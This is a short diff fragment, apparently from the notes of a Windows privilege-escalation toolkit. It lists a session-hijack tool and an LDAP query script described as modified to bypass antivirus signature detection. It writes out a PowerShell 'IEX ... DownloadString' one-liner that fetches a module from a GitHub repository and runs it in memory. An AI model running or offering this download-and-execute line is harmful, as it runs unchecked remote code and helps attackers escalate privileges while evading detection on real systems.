@@ -25,6 +25,7 @@ Start-ProcessInSession.ps1 & MS17-012.cs - non-priveleged session hijack
 # Comments: The technique used to query LDAP was based on the "Get-AuditDSDisabledUserAcount" 
 # function found in Carols Perez's PoshSec-Mod project.#
 # Modded to bypass AV sig detection.
+
 Get-SPM.psm1: 
 IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/pand0rausa/WinEscalation-/master/Get-SPM.psm1")
 
